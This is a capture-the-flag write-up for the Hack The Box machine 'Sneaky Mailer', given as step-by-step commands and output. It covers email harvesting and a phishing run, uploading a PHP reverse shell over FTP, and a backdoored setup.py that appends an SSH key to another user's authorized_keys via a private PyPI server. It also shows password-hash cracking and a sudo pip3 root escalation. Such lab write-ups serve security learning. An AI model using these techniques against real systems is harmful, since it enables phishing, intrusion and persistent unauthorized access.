---
layout: single_c
title:  "Hack The Box - Sneaky Mailer Writeup"
date:   2020-07-05 10:43:16 +0530
toc: true
categories: HTB
tags: OSCP
classes: wide
---
Hack The Box - Sneaky Mailer
![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/sneaky/sneaky.png){: .align-center}


## Enumeration

Add `sneakymailer.htb` to `hosts` and start an `nmap` scan.

### Nmap

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-12 01:43 EDT
Nmap scan report for sneakycorp.htb (10.10.10.197)
Host is up (0.41s latency).
Not shown: 990 closed ports
PORT      STATE    SERVICE   VERSION
21/tcp    open     ftp       vsftpd 3.0.3
22/tcp    open     ssh       OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp    open     smtp      Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp    open     http      nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Employee - Dashboard
143/tcp   open     imap      Courier Imapd (released 2018)
|_imap-capabilities: THREAD=REFERENCES UIDPLUS UTF8=ACCEPTA0001 STARTTLS CHILDREN NAMESPACE ACL2=UNION IDLE completed CAPABILITY OK QUOTA ACL THREAD=ORDEREDSUBJECT SORT ENABLE IMAP4rev1
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp   open     ssl/imap  Courier Imapd (released 2018)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
5280/tcp  filtered xmpp-bosh
7920/tcp  filtered unknown
8080/tcp  open     http      nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
27355/tcp filtered unknown
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.86 seconds
```

Alright, we have quite a few mail related ports. Lets do some digging for the discovered ports.

### Port 80

We are presented with a dashboard and some employee details along with their email IDs.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/sneaky/email.png){: .align-center}

There is also a `register.php` page but couldn't do anything with it. Probably a rabbit hole.

### Subdomain Fuzzing - Wfuzz
Enumerating the subdomains gives some interesting results.

```bash
kali@kali:~/Desktop/htb/sneaky$ wfuzz  --hh 0  -H 'Host: FUZZ.sneakycorp.htb' -u http://sneakycorp.htb/ --hc 400 -w /
usr/share/wordlists/wfuzz/general/common.txt -c

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://sneakycorp.htb/
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000001:   301        7 L      12 W     185 Ch      "@"
000000002:   301        7 L      12 W     185 Ch      "00"
000000003:   301        7 L      12 W     185 Ch      "01"
000000004:   301        7 L      12 W     185 Ch      "02"
000000005:   301        7 L      12 W     185 Ch      "03"
000000006:   301        7 L      12 W     185 Ch      "1"
000000007:   301        7 L      12 W     185 Ch      "10"
000000008:   301        7 L      12 W     185 Ch      "100"
000000009:   301        7 L      12 W     185 Ch      "1000"

------------------

000000265:   301        7 L      12 W     185 Ch      "devs"
000000256:   200        340 L    989 W    13737 Ch    "dev"
000000266:   301        7 L      12 W     185 Ch      "diag"
000000267:   301        7 L      12 W     185 Ch      "dial"
000000268:   301        7 L      12 W     185 Ch      "dig"
000000269:   301        7 L      12 W     185 Ch      "dir"

^C
```

Nothing interesting in the `dev` domain either.

### SMTP 

After going through all the mail ports I couldn't find anything useful. After some clues from the forums, I understood that the box is simulating a real world scenario of phishing. 

We can send mail with a `http://<ip>` link in the body to all users and see if we get any response. 

First scrap all email addresses using `cewl`

```bash
kali@kali:~/Desktop/htb/sneaky$ cewl -e --email_file emails http://sneakycorp.htb/team.php
CeWL 5.4.7 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

Now lets send mails to all users using a `bash` one liner. Start a `nc` listener on port `80`.

```bash
kali@kali:~/Desktop/htb/sneaky$ while read p; do echo Trying user $p; swaks --to $p  --body ./data ; done < emails
Trying user airisatou@sneakymailer.htb
=== Trying sneakymailer.htb:25...
=== Connected to sneakymailer.htb.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO kali
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<kali@kali>
<-  250 2.1.0 Ok
-----------------------------
```

And we get a connection for `paulbyrd@sneakymailer.htb` which includes some credentials.

```bash
kali@kali:~/Desktop/htb/sneaky$ sudo nc -lvp 80
[sudo] password for kali:
listening on [any] 80 ...
connect to [10.10.14.29] from sneakycorp.htb [10.10.10.197] 42874
POST / HTTP/1.1
Host: 10.10.14.29
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt^C
```

### Evolution

We can use evolution email client to access the mail box of `paul`

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/sneaky/mail1.png){: .align-center}

We can see two mails in the sent items folder. One contains the credentials for `developer` and another for a user named `low` regarding `PyPI` service.

![image1]({{ site.url }}{{ site.baseurl }}/assets/images/htbimg/sneaky/mail2.png){: .align-center}

### FTP

We can login to `ftp` using the credentials of the `developer`. 

The files in `ftp` belongs to the vhost `dev.sneakymailer.htb`. We can upload a `php` file and open it in browser to get a shell.

```bash
kali@kali:~/Desktop/htb/sneaky$ ftp sneakycorp.htb
Connected to sneakycorp.htb.
220 (vsFTPd 3.0.3)
ftp> user developer m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jun 30 01:15 dev
226 Directory send OK.
ftp> cd dev
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (14.9246 MB/s)
```

There seems to be a cleanup script running in the background. We will have to upload the file and open it in browser immediately to get the a shell.

```bash
kali@kali:~/Desktop/htb/sneaky$ nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.29] from sneakycorp.htb [10.10.10.197] 54676
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 22:44:12 up 10:11,  0 users,  load average: 0.24, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@sneakymailer:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@sneakymailer:/$ su developer
su developer
Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

developer@sneakymailer:/$ id
id
uid=1001(developer) gid=1001(developer) groups=1001(developer)
developer@sneakymailer:/$
```

We can use the password of `developer` to change user.

### PyPI Server

On poking around, we can see a process that is being run by `low`.

```bash
developer@sneakymailer:/$ ps aux | grep low
ps aux | grep low
low       1083  0.0  0.5  29952 20860 ?        Ss   12:33   0:17 /home/low/venv/bin/python /opt/scripts/low/install-modules.py
develop+ 24158  0.0  0.0   6076   884 pts/0    S+   22:50   0:00 grep low
```

We had also seen in the mail that `low` was doing `pypi` packages install for the system.

There is a `pypi` server running on `pypi.sneakycorp.htb:8080`. We can upload our own python package and get arbitrary code execution. It is is protected using a password. We can get the password from `.htaccess` file and crack it using `john`

```bash
$ cat .ht*
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/

kali@kali:~/Desktop/htb/sneaky$ john --wordlist=/usr/share/wordlists/rockyou.txt john                                                                                                                                                     
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
soufianeelhaoui  (pypi)
1g 0:00:00:30 DONE (2020-07-16 12:50) 0.03281g/s 117304p/s 117304c/s 117304C/s souheib2..souderton16
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## User shell

1. Download a `pypi` package.
2. Edit the setup file to include the code to append our `ssh` keys to `authorized_users`. Edit the `pypirc` file to include our credentials.
#### Setup.py  

    ```python
    kali@kali:~/Desktop/htb/sneaky/sysstat-0.1$ cat setup.py

    import setuptools
    try:
            with open("/home/low/.ssh/authorized_keys", "a") as f:
                    f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/SB6ZpFdorqmnLC/Rh+2KpkAlCf96RHUGCDQadLSdpdsKv/Od01qsgNXXpKmob1vUXxrV+emBZgkHgEB4dg77GXs39ebxxnGfP1NMX2nfd7fIjwA9keA3nLJfMNGUKXjbkctm9zMzh7hc+O9MfcZcClmEYuABz9D+ZYvIbK99d60BzDr9onZFPX5w+UCsZ+pKn8DIGiFDUmcvRyFB8XlzDZ/bnLxN+7Xm+S************************************************************AwNrlXxbH81W9P1fJDJ5hnTlQvEWox6qyljHystGvreORlDkMb/WSEcqtdls7T+OBEjfIZ3QsgjD89cnai8SYPxAoXRTBPRma7gVl9UKYOGIDrBTcGzfSvGsbbAj8IlBMyWLmn****b6zIUnkxDd8oOEWquD5UzCmc/7tHu683Ev904fixq5LyFuCHm8hw+/ISOM1PzCssE= kali@kali")

            f.close()
    except Exception as e:
            pass
    setuptools.setup(
    name="example-pkg3", # Replace with your own username
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
    "Programming Language :: Python :: 3",
    "License :: OSI Approved :: MIT License",
    "Operating System :: OS Independent",
    ],
    )
    ```
    #### .pypirc
    ```bash
    kali@kali:~/Desktop/htb/sneaky$ cat .pypirc
    [distutils]
    index-servers =
      local

    [local]
    repository: http://pypi.sneakycorp.htb:8080
    username: pypi
    password: soufianeelhaoui
    ```
3. Transfer the files to the system and upload it to `pypi` server using `python3 setup.py sdist register -r local upload -r local`. The `.pypirc` file must be in the directory specified by `HOME` env variable. 

```bash
developer@sneakymailer:/tmp$ wget http://10.10.14.29:8000/sys.tar.gz
wget http://10.10.14.29:8000/sys.tar.gz
--2020-07-19 23:10:35--  http://10.10.14.29:8000/sys.tar.gz
Connecting to 10.10.14.29:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/gzip]
Saving to: ‘sys.tar.gz’

sys.tar.gz          100%[===================>]  20.00K  55.0KB/s    in 0.4s

2020-07-19 23:10:36 (55.0 KB/s) - ‘sys.tar.gz’ saved [20480/20480]

developer@sneakymailer:/tmp$ tar -xvf sys.tar.gz
tar -xvf sys.tar.gz
./sysstat-0.1/
./sysstat-0.1/setup.cfg
./sysstat-0.1/README.md
./sysstat-0.1/sysstat/
./sysstat-0.1/sysstat/conf.ini
./sysstat-0.1/sysstat/__main__.py
./sysstat-0.1/sysstat/__init__.py
./sysstat-0.1/sysstat.egg-info/
./sysstat-0.1/sysstat.egg-info/top_level.txt
./sysstat-0.1/sysstat.egg-info/dependency_links.txt
./sysstat-0.1/sysstat.egg-info/PKG-INFO
./sysstat-0.1/sysstat.egg-info/SOURCES.txt
./sysstat-0.1/sysstat.egg-info/requires.txt
./sysstat-0.1/PKG-INFO
./sysstat-0.1/setup.py
./sysstat-0.1/MANIFEST.in

developer@sneakymailer:/tmp/sysstat-0.1$ python3 setup.py sdist register -r local upload -r local
<n3 setup.py sdist register -r local upload -r local
running sdist
running egg_info
creating example_pkg3.egg-info
writing example_pkg3.egg-info/PKG-INFO
writing dependency_links to example_pkg3.egg-info/dependency_links.txt
writing top-level names to example_pkg3.egg-info/top_level.txt
writing manifest file 'example_pkg3.egg-info/SOURCES.txt'
reading manifest file 'example_pkg3.egg-info/SOURCES.txt'
reading manifest template 'MANIFEST.in'
warning: no files found matching 'sysstat/README.md'
writing manifest file 'example_pkg3.egg-info/SOURCES.txt'
running check
creating example-pkg3-0.0.1
creating example-pkg3-0.0.1/example_pkg3.egg-info
creating example-pkg3-0.0.1/sysstat
copying files to example-pkg3-0.0.1...
copying MANIFEST.in -> example-pkg3-0.0.1
copying README.md -> example-pkg3-0.0.1
copying setup.cfg -> example-pkg3-0.0.1
copying setup.py -> example-pkg3-0.0.1
copying example_pkg3.egg-info/PKG-INFO -> example-pkg3-0.0.1/example_pkg3.egg-info
copying example_pkg3.egg-info/SOURCES.txt -> example-pkg3-0.0.1/example_pkg3.egg-info
copying example_pkg3.egg-info/dependency_links.txt -> example-pkg3-0.0.1/example_pkg3.egg-info
copying example_pkg3.egg-info/top_level.txt -> example-pkg3-0.0.1/example_pkg3.egg-info
copying sysstat/conf.ini -> example-pkg3-0.0.1/sysstat
Writing example-pkg3-0.0.1/setup.cfg
creating dist
Creating tar archive
removing 'example-pkg3-0.0.1' (and everything under it)
running register
Registering example-pkg3 to http://pypi.sneakycorp.htb:8080
Server response (200): OK
WARNING: Registering is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
running upload
Submitting dist/example-pkg3-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080
Server response (200): OK
WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
```

Now we can `ssh` into the machine.

```bash
kali@kali:~/Desktop/htb/sneaky$ ssh -i id_rsa low@sneakymailer.htb
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105
low@sneakymailer:~$ 
```

## Root Shell

We can run `pip3` with `sudo`.

```bash
kali@kali:~/Desktop/htb/sneaky$ ssh -i id_rsa low@sneakymailer.htb
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105
low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
```

There is a `gtfobin` entry for `pip`. We can use that to get root.

```bash
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:~$ sudo /usr/bin/pip3 install $TF
id
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.AzBugC2tJC
# uid=0(root) gid=0(root) groups=0(root)
```

And we are root.